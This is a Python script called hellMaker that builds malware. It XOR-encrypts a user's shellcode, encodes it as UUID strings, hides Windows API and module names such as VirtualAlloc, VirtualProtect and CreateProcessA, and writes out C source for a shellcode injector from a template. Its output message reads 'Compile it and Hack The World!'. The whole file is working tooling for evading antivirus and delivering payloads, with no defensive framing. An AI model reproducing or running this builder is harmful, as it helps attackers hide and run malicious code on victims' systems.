#!/usr/bin/python3

import uuid, random, sys, os.path, string


TEMPLATE_PATH = os.path.join(os.path.dirname(os.path.realpath(__file__)), "templates/template.c")


class Color:
    BIBlue   = "\033[1;94m"
    BIRed    = "\033[1;91m"
    Red      = "\033[0;31m"
    Green    = "\033[0;32m"
    Bold     = "\033[1m"
    NC       = "\033[0m"   # No Color


def banner():
    print(Color.BIBlue + f"""
         _          _ _ __  __       _             
        | |__   ___| | |  \/  | __ _| | _____ _ __ 
        | '_ \ / _ \ | | |\/| |/ _` | |/ / _ \ '__|
        | | | |  __/ | | |  | | (_| |   <  __/ |   
        |_| |_|\___|_|_|_|  |_|\__,_|_|\_\___|_|   
                {Color.NC}{Color.BIRed}Author{Color.NC}{Color.Bold} -> Abdallah Mohamed                                        

    """ + Color.NC)

def usage():
    print(f"\tUsage:\n\t\t./{os.path.basename(sys.argv[0])} <path/to/shellcode.bin> <EncryptionKey> <Output.c>\n\n")


def display(msg, color, **args):
    print(f"\t - {color}{msg}{Color.NC}", **args)

def display_info(msg, **args):
    display(msg, Color.Green, **args)

def display_warn(msg, **args):
    display(msg, Color.Bold, **args)

def display_fail(msg, **args):
    display(msg, Color.Red, **args)


def read_file(fileName, mode):
    with open(fileName, mode) as f:
        return f.read()

def write_file(fileName, mode, data):
    with open(fileName, mode) as f:
        return f.write(data)


def create_random_string(length):
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))


def get_data_elements(data):
    return list(map(ord, data))


def obfuscate_data(data, key):
    elements = get_data_elements(data)
    obfuscated_data = bytes(
        (elements[i] ^ key) for i in range(0, len(elements))
    )

    obfuscated_data += b'\x00' # Append NULL at the end of the data
    return obfuscated_data


def encrypt_shellcode(shellcode, size, encKey):
    keySize = len(encKey)
    elements = get_data_elements(encKey)
    return bytes(
        (shellcode[idx] ^ elements[idx % keySize]) for idx in range(0, size)
    )


def chunked(data, size):
    for i in range(0, len(data), size):
        yield data[i:i + size]


def convert_to_uuids(data):
    chunks = list(chunked(data, 16))
    last_element_size = len(chunks[-1])

    if last_element_size != 16:
        padding = 16 - last_element_size
        chunks[-1] = chunks[-1] + (b'\x90' * padding)

    uuids = "{\n"
    for chunk in chunks:
        uuids += f"{' ' * 8}\"{uuid.UUID(bytes_le=chunk)}\",\n"

    return uuids[:-2] + "\n}"


def convert_to_hex(data):
    return [hex(i) for i in data]


def obfuscate_and_convert_data_to_c_fmt(data, key):
    fmt = '{ '
    elements = convert_to_hex(obfuscate_data(data, key))
    
    for i in elements:
        fmt += i + ', '

    return fmt[:-2] + ' }'


def run(fileName, encKey, output):
    shellcode = read_file(fileName, 'rb')
    template = read_file(TEMPLATE_PATH, 'r')
    shellcode_size = len(shellcode)
    key = random.randint(200, 255)

    display_info("Encrypt shellcode using xor method")
    encrypted_shellcode = encrypt_shellcode(shellcode, shellcode_size, encKey)

    display_info("Convert encrypted shellcode to UUIDs")
    template = template.replace('"UUIDs"', convert_to_uuids(encrypted_shellcode))

    display_info("Obfuscate encryption key")
    template = template.replace('"DECKEY"', obfuscate_and_convert_data_to_c_fmt(encKey, key))

    display_info("Set PREPROCESSORs values")
    template = template.replace('"KEY"', hex(key))
    template = template.replace('"SIZE"', hex(shellcode_size))

    display_info("Obfuscate Modules and APIs")
    template = template.replace('"kernel32.dll"', obfuscate_and_convert_data_to_c_fmt("kernel32.dll", key))
    template = template.replace('"mshtml.dll"', obfuscate_and_convert_data_to_c_fmt("mshtml.dll", key))
    template = template.replace('"CreateFileA"', obfuscate_and_convert_data_to_c_fmt("CreateFileA", key))
    template = template.replace('"CreateProcessA"', obfuscate_and_convert_data_to_c_fmt("CreateProcessA", key))
    template = template.replace('"ReadProcessMemory"', obfuscate_and_convert_data_to_c_fmt("ReadProcessMemory", key))
    template = template.replace('"TerminateProcess"', obfuscate_and_convert_data_to_c_fmt("TerminateProcess", key))
    template = template.replace('"VirtualAlloc"', obfuscate_and_convert_data_to_c_fmt("VirtualAlloc", key))
    template = template.replace('"VirtualProtect"', obfuscate_and_convert_data_to_c_fmt("VirtualProtect", key))

    display_info("Save malware source code in '%s'" % output)
    write_file(output, 'w+', template)

    display("Compile it and Hack The World! ^_^", Color.Bold)


def main():
    banner()

    args = sys.argv
    args_len = len(args)

    if args_len < 2:
        usage()
        return 1

    if not os.path.exists(args[1]):
        display_fail("shellcode file does not exist in '%s' !!!" % args[1])
        return 1

    if args_len < 3:
        encKey = create_random_string(random.randint(8, 12))
        display_warn("You didn't enter the encryption key")
        display_info("hellMaker will use this random key => '%s'" % encKey)
    else:
        encKey = args[2]

    if args_len < 4:
        output = "hellInjector.c"
        display_warn("You didn't enter output file name")
        display_info("hellMaker will save your output file in '%s'" % output)
    else:
        output = args[3]

    if not os.path.exists(TEMPLATE_PATH):
        display_fail("This is bad, Malware template does not exist !!!")
        display_warn("Please reinstall the tool")
        return 1

    if os.path.exists(output):
        display_warn("'%s' already exists, do you want to overwrite it [Y,n] : " % output, end='')

        try:
            key = input()
        except KeyboardInterrupt:
            display_fail("Enter valid value")
            return 1

        if key.lower() != 'y':
            print()
            display_fail("Try again !!!")
            return 1


    run(args[1], encKey, output)


if __name__ == '__main__':
    main()